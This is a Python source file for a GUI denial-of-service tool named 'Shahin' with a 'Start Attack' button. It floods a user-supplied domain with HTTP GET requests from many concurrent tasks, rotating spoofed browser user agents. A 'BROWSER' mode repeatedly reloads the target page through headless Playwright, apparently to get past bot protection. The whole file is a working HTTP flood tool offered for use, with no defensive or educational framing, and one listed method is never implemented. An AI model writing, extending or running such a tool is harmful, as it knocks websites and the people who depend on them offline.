import tkinter as tk
from tkinter import ttk, messagebox
import aiohttp
import asyncio
import time
import random
from playwright.async_api import async_playwright

class AttackApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Shahin")
        self.root.configure(bg='black')
        self.running = False
        self.setup_ui()

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        ]

    def setup_ui(self):
        title_label = tk.Label(self.root, text="Shahin", font=("Helvetica", 24, "bold"), fg='white', bg='black')
        title_label.pack(pady=10)

        frame = tk.Frame(self.root, bg='black')
        frame.pack(padx=10, pady=10, fill='x', expand=False)

        tk.Label(frame, text="Enter Domain:", bg='black', fg='white').grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.domain_entry = tk.Entry(frame, width=35)
        self.domain_entry.grid(row=1, column=0, padx=5, pady=5)

        tk.Label(frame, text="Enter Threads:", bg='black', fg='white').grid(row=2, column=0, padx=5, pady=5, sticky='w')
        self.threads_entry = tk.Entry(frame, width=35)
        self.threads_entry.grid(row=3, column=0, padx=5, pady=5)

        tk.Label(frame, text="Enter Time (seconds):", bg='black', fg='white').grid(row=4, column=0, padx=5, pady=5, sticky='w')
        self.duration_entry = tk.Entry(frame, width=35)
        self.duration_entry.grid(row=5, column=0, padx=5, pady=5)

        tk.Label(frame, text="Select Method:", bg='black', fg='white').grid(row=6, column=0, padx=5, pady=5, sticky='w')
        self.method_var = tk.StringVar(value="HTTP-BYPASS")
        method_combobox = ttk.Combobox(frame, textvariable=self.method_var, values=["HTTP-BYPASS", "HTTP-RAW", "BROWSER"], state='readonly', width=33)
        method_combobox.grid(row=7, column=0, padx=5, pady=5)

        start_button = tk.Button(self.root, text="Start Attack", command=self.start_attack, bg='#1C1C1C', fg='#FFFFFF', font=("Helvetica", 14))
        start_button.pack(pady=10)

    async def send_requests(self, url, duration):
        end_time = time.time() + duration
        request_count = 0
        
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time and self.running:
                headers = {'User-Agent': random.choice(self.user_agents)}
                try:
                    async with session.get(url, headers=headers, timeout=1) as response:
                        request_count += 1
                        print(f"Request sent: {response.status}")
                except Exception as e:
                    print(f"Request failed: {str(e)}")

        print(f"Total requests sent: {request_count}")
        self.stop_attack()

    async def browser_bypass(self, url, duration):
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(user_agent=random.choice(self.user_agents))
            page = await context.new_page()
            
            try:
                await page.goto(url, timeout=60000)
                start_time = time.time()
                
                while time.time() - start_time < duration and self.running:
                    await page.reload()
                    print("Request sent via browser")
                    await asyncio.sleep(0.00001) 

            except Exception as e:
                print(f"Browser request failed: {e}")
            
            finally:
                await browser.close()
                self.stop_attack()

    def start_attack(self):
        url = self.domain_entry.get()
        threads = int(self.threads_entry.get())
        duration = int(self.duration_entry.get())
        method = self.method_var.get()
        
        if not url or not threads or not duration:
            messagebox.showwarning("Input Error", "All fields must be filled out!")
            return
        
        self.disable_inputs()
        self.running = True

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        if method == "HTTP-BYPASS":
            for _ in range(threads):
                loop.create_task(self.send_requests(url, duration))
        
        elif method == "BROWSER":
            for _ in range(threads):
                loop.create_task(self.browser_bypass(url, duration))

        loop.run_forever()

    def stop_attack(self):
        self.running = False
        self.enable_inputs()

    def disable_inputs(self):
        self.domain_entry.config(state='disabled')
        self.threads_entry.config(state='disabled')
        self.duration_entry.config(state='disabled')

    def enable_inputs(self):
        self.domain_entry.config(state='normal')
        self.threads_entry.config(state='normal')
        self.duration_entry.config(state='normal')

root = tk.Tk()
app = AttackApp(root)
root.mainloop()